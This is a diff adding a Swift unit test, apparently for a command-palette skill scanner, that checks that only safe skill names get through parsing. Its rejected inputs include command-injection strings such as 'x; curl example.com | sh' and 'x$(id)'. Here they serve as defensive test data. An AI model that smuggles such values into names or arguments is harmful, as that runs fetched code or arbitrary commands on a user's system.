@@ -114,6 +114,24 @@ final class PaletteSkillScannerTests: XCTestCase {
         XCTAssertTrue(PaletteSkillScanner.scan(roots: [userRoot]).isEmpty)
     }
 
+    func testOnlySafeSkillNamesReachThePalette() {
+        func parsed(name: String, fallback: String = "dir") -> PaletteSkill? {
+            PaletteSkillScanner.parse(
+                "---\nname: \(name)\ncortland-palette: true\ncortland-palette-submit: true\n---\n",
+                fallbackName: fallback
+            )
+        }
+        XCTAssertEqual(parsed(name: "stage-and-commit")?.name, "stage-and-commit")
+        XCTAssertEqual(parsed(name: "plugin:skill")?.name, "plugin:skill")
+        XCTAssertNil(parsed(name: "two words"))
+        XCTAssertNil(parsed(name: "x; curl example.com | sh"))
+        XCTAssertNil(parsed(name: "x$(id)"))
+        // A CR survives the line split; a newline can only arrive through the
+        // directory name the scanner falls back on.
+        XCTAssertNil(parsed(name: "x\ry"))
+        XCTAssertNil(PaletteSkillScanner.parse("---\ncortland-palette: true\n---\n", fallbackName: "x\ny"))
+    }
+
     func testMissingRootScansToEmpty() {
         let missing = userRoot.appendingPathComponent("does-not-exist")
         XCTAssertTrue(PaletteSkillScanner.scan(roots: [missing]).isEmpty)
